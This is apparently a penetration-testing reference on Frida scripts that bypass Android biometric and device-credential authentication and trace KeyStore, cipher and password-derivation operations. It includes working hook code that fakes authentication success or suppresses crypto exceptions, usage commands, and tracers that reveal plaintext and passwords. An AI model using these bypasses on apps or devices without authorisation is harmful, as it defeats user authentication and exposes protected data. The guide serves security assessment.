# Biometric & KeyStore Authentication Bypass

Frida scripts for bypassing Android biometric authentication and auditing KeyStore implementations.
Source: [ReversecLabs/android-keystore-audit](https://github.com/ReversecLabs/android-keystore-audit)

## Decision Tree: Which Bypass to Use

```
App prompts for biometric authentication
    │
    ├─ Does app use CryptoObject in authenticate()?
    │   │
    │   ├─ NO (null CryptoObject) ─────────> fingerprint-bypass.js (auto-bypass)
    │   │
    │   └─ YES (CryptoObject present)
    │       │
    │       ├─ Is crypto operation used only for CONFIRMATION
    │       │  (key not critical for actual data)?
    │       │   │
    │       │   └─ YES ────────────────────> fingerprint-bypass-via-exception-handling.js
    │       │                                (swallows IllegalBlockSizeException)
    │       │
    │       └─ Crypto is REQUIRED for actual
    │          data encryption/decryption
    │           │
    │           └─ Does key use time-based auth
    │              (setUserAuthenticationValidityDurationSeconds != -1)?
    │               │
    │               └─ YES ────────────────> keyguard-credential-intent.js
    │                                        (trigger device unlock to validate key)
    │
    └─ App uses device credential (PIN/pattern) instead of biometric
        └─ ───────────────────────────────> keyguard-credential-intent.js
```

## Script 1: fingerprint-bypass.js (Auto-Bypass, Null CryptoObject)

**When to use:** App accepts NULL CryptoObject in `onAuthenticationSucceeded()`. This is the most common case - the biometric check is purely a UI gate, not tied to crypto.

**How it works:** Hooks `authenticate()`, immediately creates a fake `AuthenticationResult` with null cipher, and calls `onAuthenticationSucceeded()`. Fires automatically - no manual step needed.

**Hooks:**
- `BiometricPrompt.authenticate()` (both overloads)
- `FingerprintManagerCompat.authenticate()` (android.support + androidx)
- `FingerprintManager.authenticate()`

**Usage:**
```bash
frida -U -l fingerprint-bypass.js <package_name>
# Navigate to biometric screen in app
# Bypass fires automatically when authenticate() is called
```

**Key code pattern:**
```javascript
// Creates fake auth result with null cipher
function getBiometricPromptAuthResult() {
    var sweet_cipher = null;
    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
    var cryptoInst = cryptoObj.$new(sweet_cipher);
    var resultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    return getAuthResult(resultObj, cryptoInst);
}

// In hook: immediately call success callback
biometricPrompt.implementation = function(cancellationSignal, executor, callback) {
    var authResult = getBiometricPromptAuthResult();
    callback.onAuthenticationSucceeded(authResult);
}
```

**Handles multiple AuthenticationResult constructor signatures** (different API versions):
```javascript
function getAuthResult(resultObj, cryptoInst) {
    try { return resultObj.$new(cryptoInst, null, 0, false); } catch(e) {
    try { return resultObj.$new(cryptoInst, null, 0); } catch(e) {
    try { return resultObj.$new(cryptoInst, null); } catch(e) {
    try { return resultObj.$new(cryptoInst, 0); } catch(e) {
         return resultObj.$new(cryptoInst);
    }}}}
}
```

---

## Script 2: fingerprint-bypass-via-exception-handling.js (CryptoObject Present)

**When to use:** App uses CryptoObject with biometric auth, but the crypto is only used as confirmation (e.g., app encrypts data with a different key). When the biometric-bound key is used without proper auth, `IllegalBlockSizeException` is thrown - this script catches and suppresses it.

**How it works:** Hooks all `Cipher.doFinal()` (7 overloads) and `Cipher.update()` (5 overloads) to catch `IllegalBlockSizeException` and return dummy data. You must manually trigger the bypass after the biometric screen appears.

**Usage:**
```bash
frida -U -l fingerprint-bypass-via-exception-handling.js <package_name>
# 1. Navigate to biometric screen
# 2. Frida logs "authenticate() method was called"
# 3. In Frida console, type:
bypass()
```

**Key code pattern:**
```javascript
// Wraps Cipher.doFinal in try/catch to swallow IllegalBlockSizeException
function hookDoFinal() {
    var cipherDoFinal = Java.use('javax.crypto.Cipher')['doFinal'].overload();
    cipherDoFinal.implementation = function() {
        try {
            var tmp = this.doFinal();
            return tmp;
        } catch(ex) {
            // IllegalBlockSizeException = key wasn't unlocked by biometric
            // Return empty byte array instead of crashing
            console.log("doFinal() exception: " + ex);
            return [0];
        }
    }
}

// Manual bypass trigger - call from Frida console
function bypass() {
    Java.perform(function() {
        var Runnable = Java.use('java.lang.Runnable');
        var Runner = Java.registerClass({
            name: 'com.bypass.Runner',
            implements: [Runnable],
            methods: {
                run: function() {
                    callbackG.onAuthenticationSucceeded(authenticationResultInst);
                }
            }
        });
        var Handler = Java.use('android.os.Handler');
        var Looper = Java.use('android.os.Looper');
        var handler = Handler.$new(Looper.getMainLooper());
        handler.post(Runner.$new());
    });
}
```

---

## Script 3: keyguard-credential-intent.js (Device Credential Unlock)

**When to use:** Key requires user authentication via device credentials (PIN/pattern/password) with a time-based validity (`setUserAuthenticationValidityDurationSeconds != -1`). Programmatically triggers the device unlock screen.

**Usage:**
```bash
frida -U -l keyguard-credential-intent.js <package_name>
# Wait for app to create activities
# In Frida console:
ListActivities()     # See collected activities
showKeyguard()       # Trigger device credential prompt
# Enter PIN/pattern/password on device
# Key is now unlocked for the validity duration
```

**Key code pattern:**
```javascript
function showKeyguard() {
    Java.perform(function() {
        var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var mKeyguardManager = ctx.getSystemService("keyguard");
        var mKeyguardManagerCls = Java.use("android.app.KeyguardManager");
        var intent = mKeyguardManagerCls['createConfirmDeviceCredentialIntent']
            .call(mKeyguardManager, null, null);
        activitiesList[0].startActivityForResult(null, intent, 1, null);
    });
}
```

---

## Script 4: tracer-cipher.js (Crypto Audit - No Bypass)

**When to use:** Audit what encryption operations the app performs. Traces all `Cipher` usage including algorithm, mode, key type, and hexdumps of plaintext/ciphertext.

**Hooks:** `Cipher.getInstance()` (3), `Cipher.init()` (8), `Cipher.doFinal()` (7), `Cipher.update()` (5)

**Usage:**
```bash
frida -U -l tracer-cipher.js <package_name>
# Use the app - all crypto operations logged
# Interactive functions:
ListCiphers()                              # List captured Cipher instances
GetCipher("javax.crypto.Cipher@b6859ee")   # Get specific instance
doFinal("javax.crypto.Cipher@b6859ee")     # Manually trigger doFinal
```

---

## Script 5: tracer-keygenparameterspec.js (Key Protection Audit)

**When to use:** Understand how KeyStore keys are configured. Traces all `KeyGenParameterSpec.Builder` calls to reveal security parameters.

**Hooks (what gets logged):**
- `setUserAuthenticationRequired(boolean)` - Is biometric/credential needed?
- `setUserAuthenticationValidityDurationSeconds(int)` - How long is key unlocked? (-1 = per-use)
- `setInvalidatedByBiometricEnrollment(boolean)` - Key invalidated on new fingerprint?
- `setIsStrongBoxBacked(boolean)` - Is key in secure hardware (StrongBox)?
- `setUserConfirmationRequired(boolean)` - Needs explicit user confirmation?
- `setUnlockedDeviceRequired(boolean)` - Only works when device is unlocked?
- `setRandomizedEncryptionRequired(boolean)` - Forces random IV?
- `setKeySize(int)` - Key size in bits

**Usage:**
```bash
frida -U -l tracer-keygenparameterspec.js <package_name>
# Trigger key generation in app (login, setup, etc.)
# Output shows how each key is protected
```

**What to look for (bad configs):**
```
setUserAuthenticationRequired(false)              # Key usable without auth!
setUserAuthenticationValidityDurationSeconds(300)  # 5 min window - may be too long
setInvalidatedByBiometricEnrollment(false)         # New fingerprint doesn't invalidate
setIsStrongBoxBacked(false)                        # Not in secure hardware
setRandomizedEncryptionRequired(false)             # Deterministic encryption
```

---

## Script 6: tracer-keystore.js (KeyStore Operations Audit)

**When to use:** Trace all KeyStore operations - key storage, retrieval, aliases, entry types.

**Hooks:** KeyStore constructor, `getInstance()`, `load()`, `store()`, `getKey()`, `setEntry()`, `getEntry()`, `getCertificateChain()`

**Usage:**
```bash
frida -U -l tracer-keystore.js <package_name>
# Interactive:
ListAliasesAndroid()            # List all AndroidKeyStore aliases
ListAliasesStatic()             # List aliases across known keystore types
ListAliasesRuntime()            # List aliases from runtime-captured instances
AliasInfo("my_secret_key")     # Get detailed key properties as JSON
GetKeyStore("KeyStore@af102a") # Get specific keystore instance
```

---

## Script 7: tracer-secretkeyfactory.js (PBKDF Audit)

**When to use:** App derives keys from passwords. Traces `PBEKeySpec` to reveal plaintext passwords, salts, iteration counts, and key lengths.

**Usage:**
```bash
frida -U -l tracer-secretkeyfactory.js <package_name>
# Trigger password-based operations
# Output: password (plaintext), salt (hex), iteration count, key length
```

**What to look for (weak params):**
```
Password: "hardcoded_password"    # Hardcoded password
Salt: 0000000000000000            # Static/zero salt
Iteration count: 1000             # Too low (should be 600k+ for PBKDF2)
Key length: 128                   # May be insufficient
```

---

## Combined Audit Workflow

For a comprehensive biometric/keystore security assessment:

```bash
# Step 1: Trace key generation parameters
frida -U -l tracer-keygenparameterspec.js -l tracer-keystore.js <pkg>
# Register/login in app to trigger key creation
# Assess: Is auth required? What validity? StrongBox? Randomized?

# Step 2: Trace crypto operations
frida -U -l tracer-cipher.js -l tracer-secretkeyfactory.js <pkg>
# Use app features that involve encryption
# Assess: What algorithms? ECB mode? Hardcoded passwords?

# Step 3: Attempt bypass
# Based on Step 1 findings, choose the right bypass script:
frida -U -l fingerprint-bypass.js <pkg>              # If null CryptoObject
frida -U -l fingerprint-bypass-via-exception-handling.js <pkg>  # If CryptoObject present
frida -U -l keyguard-credential-intent.js <pkg>       # If device credential key

# Step 4: Verify bypass impact
# If bypass succeeds: what data/functionality is now accessible?
# Document: auth bypass severity, data exposure, business impact
```

## Integration with Medusa

Medusa has complementary modules:
```bash
medusa> use encryption/cipher_1              # Similar to tracer-cipher.js
medusa> use helpers/keystore_extract          # Extract keys from KeyStore
medusa> use root_detection/anti_root          # May be needed before biometric screen
```

Use Medusa for general monitoring, use these ReversecLabs scripts specifically for biometric bypass and KeyStore audit (they are more thorough for this specific use case).
